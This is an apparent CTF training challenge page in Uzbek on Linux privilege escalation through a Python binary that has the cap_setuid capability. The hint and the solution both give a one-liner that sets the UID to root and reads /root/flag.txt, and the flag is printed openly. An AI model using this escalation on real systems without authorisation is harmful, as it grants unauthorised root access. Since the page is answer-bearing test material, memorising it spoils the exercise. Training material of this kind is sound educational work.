---
id: 18
title: "CH18: Linux Capability cap_setuid Binary Abuse"
module: "Modul 2: PrivEsc & Binary Exploitation"
difficulty: Hard
points: 8
tags: ['capabilities', 'python', 'root', 'privesc']
flag: "HD{cap_setuid_python_escalation_918}"
---

# 🎯 Topshiriq #18: CH18: Linux Capability cap_setuid Binary Abuse

## 📌 Metama'lumotlar:
* **Modul:** `Modul 2: PrivEsc & Binary Exploitation`
* **Qiyinlik darajasi:** `🔴 Hard`
* **Maksimal Ball:** `⭐ 8 ball`
* **Teglar:** #capabilities, #python, #root, #privesc

---

## 📝 Topshiriq Senariysi (Scenario):
/usr/bin/python3.14 ga 'cap_setuid+ep' berilgan. Python 'os.setuid(0)' chaqiruvi orqali to'liq root imtiyozini qo'lga kiriting.

---

## 💡 Kichik Maslahat (Hint):
> [!TIP]
> python3 -c 'import os; os.setuid(0); os.system("cat /root/flag.txt")'

---

## 🛠️ Professional Yechim Ko'rsatmasi:
```bash
# Topshiriqni yechish bo'yicha ko'rsatma:
python3 -c 'import os; os.setuid(0); os.system("cat /root/flag.txt")'
```

---

## 🚩 Maxfiy Flag:
`HD{cap_setuid_python_escalation_918}`
